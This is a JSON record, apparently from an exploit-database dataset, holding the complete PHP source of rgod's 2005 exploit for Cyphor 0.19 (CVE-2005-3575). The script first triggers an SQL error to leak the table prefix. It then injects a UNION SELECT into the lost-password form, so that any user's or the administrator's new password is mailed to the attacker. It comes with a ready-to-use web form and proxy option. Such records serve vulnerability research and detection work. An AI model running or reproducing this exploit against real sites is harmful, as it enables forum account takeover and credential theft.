{
  "id": "1241",
  "title": "Cyphor 0.19 - Board Takeover (SQL Injection)",
  "cve": "CVE-2005-3575",
  "vuln_type": "sqli",
  "code": "<?php\r\n#   quoted from rgod \"1)if magic quotes off -> SQL Injection:\" /str0ke\r\n#\r\n#   --- cyphor019_xpl.php                                   7.36 08/10/2005    #\r\n#                                                                              #\r\n#   Cyphor 0.19 ( possibly prior versions) SQL injection / board takeover      #\r\n#                                                                              #\r\n#                                by rgod                                       #\r\n#                      site: http://rgod.altervista.org                        #\r\n#                                                                              #\r\n#   make these changes in php.ini if you have troubles                         #\r\n#   to launch this script:                                                     #\r\n#   allow_call_time_pass_reference = on                                        #\r\n#   register_globals = on                                                      #\r\n#                                                                              #\r\n#   usage: launch this script from Apache, fill requested fields, then         #\r\n#   send yourself any user / admin password right now!                         #\r\n#                                                                              #\r\n#   Sun Tzu: \"There are five ways of attacking with fire. The first is to burn #\r\n#   soldiers in their camp; the second is to burn stores; the third is to burn #\r\n#   baggage trains; the fourth is to burn arsenals and magazines; the fifth is #\r\n#   to hurl dropping fire amongst the opponent.\"                               #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title>Cyphor 0.19  SQL Injection/board takeover  </title><meta\r\nhttp-equiv=\"Content-Type\"   content=\"text/html;  charset=iso-8859-1\">     <style\r\ntype=\"text/css\"> body {\tbackground-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;\r\nSCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:   #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #1CBr81; } a:hover{text-decoration: underline;\r\ncolor : #1CB081; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\nCyphor 0.19 (possibly prior versions) SQL injection / board takeover      </p><p\r\nclass=\"Stile6\"> a  script  by rgod  at  <a     href=\"http://rgod.altervista.org\"\r\ntarget=\"_blank\"> http://rgod.altervista.org</a></p> <table width=\"84%\"><tr>  <td\r\nwidth=\"43%\"><form name=\"form1\" method=\"post\" action=\"'.$SERVER[PHP_SELF].'?path=\r\nvalue&host=value&port=value&username=value&proxy=value&your_email=value\">    <p>\r\n<input type=\"text\" name=\"host\"><span class=\"Stile5\"> hostname (ex: www.sitename.\r\ncom)</span></p><p><input type=\"text\" name=\"path\"><span class=\"Stile5\"> path (ex:\r\n/cyphor/ or /forum/ or just /)</span></p><p><input type=\"text\" name=\"port\"><span\r\nclass=\"Stile5\"> specify a port other than 80 (default value)</span></p><p><input\r\ntype=\"text\" name=\"username\"><span class=\"Stile5\">user whom you want the password\r\n,admin? ;)   </span>   </p>   <p>     <input type=\"text\" name=\"your_email\"><span\r\nclass=\"Stile5\"> email where the password will be sent</span>  </p>  <p>   <input\r\ntype=\"text\" name=\"proxy\"><span class=\"Stile5\"> send exploit through an HTTP prox\r\ny (ip:port)    </span></p><p><input type=\"submit\" name=\"Submit\" value=\"go!\"></p>\r\n</form></td></tr></table></body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket($packet)\r\n{\r\nglobal $proxy, $host, $port, $html;\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);\r\n            if (!$ock) { echo 'No response from '.htmlentities($host).'...';\r\n\t\t\tdie;\r\n\t\t       }}\r\n\r\n             else\r\n           {\r\n\t    if (!eregi($proxy_regex,$proxy))\r\n\t    {echo htmlentities($proxy).' -> not a valid proxy...';\r\n\t     die;\r\n\t    }\r\n\t   $parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $ock=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$ock) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t   }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n  {\r\n\r\n    $html='';\r\n    while (!feof($ock))\r\n      {\r\n        $html.=fgets($ock);\r\n      }\r\n  }\r\nelse\r\n  {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n    {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\nfclose($ock);\r\necho nl2br(htmlentities($html));\r\n}\r\n\r\ndefine('EMAIL_PREG', '#^[a-z0-9&\\-_.\\+]+?@[\\w\\-]+\\.([\\w\\-\\.]+\\.)?[\\w]+$#');\r\ndefine('USER_PREG', '#^[A-Za-z0-9_\\-]+$#');\r\n\r\nif (($path<>'') and ($host<>'') and ($your_email<>'') and ($username<>''))\r\n{\r\nif (!preg_match(EMAIL_PREG, $your_email)) {echo '<br>Need a valid email...'; die;}\r\nif (!preg_match(USER_PREG, $username)) {echo '<br>Need a valid username...'; die;}\r\n  if ($port=='') {$port=80;}\r\n  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n#STEP 1 -> retrieve the table prefix...\r\n$packet=\"GET \".$p.\"show.php?fid=' HTTP/1.0 \\r\\n\";\r\n$packet.=\"User-Agent: GetRight/4.5xx\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n$packet.=\"Accept-Encoding: text/plain\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\n\r\n$temp=explode(\"SELECT * FROM \",$html);\r\n$temp2=explode(\"forums WHERE\",$temp[1]);\r\n$table_prefix=trim($temp2[0]);\r\n\r\necho '<br> Table prefix ->'.htmlentities($table_prefix);\r\nif ($table_prefix=='') {echo 'Exploit failed...'; die;}\r\n\r\n#STEP 2 -> send yourself a new password...\r\n$sql=\"') UNION SELECT * FROM \".$table_prefix.\"users WHERE nick='\".$username.\"'/*\";\r\n$sql=urlencode($sql);\r\n$data=\"email=\".urlencode($your_email).\"&nick=\".$sql.\"&submit=Submit\";\r\n$packet=\"POST \".$p.\"lostpwd.php HTTP/1.1\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\":\".$port.$path.\"lostpwd.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Internet Ninja x.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nshow($packet);\r\nsendpacket($packet);\r\nif (eregi(\"New password sent.\",$html)) {echo '<br>Exploit successful...check your email box...';}\r\n\t\t\t\telse   {echo '<br>Exploit failed...';}\r\n}\r\nelse\r\n{ echo 'Fill in requested fields, optionally specify a proxy...'; }\r\n?>\r\n\r\n# milw0rm.com [2005-10-08]",
  "url": "https://www.exploit-db.com/exploits/1241"
}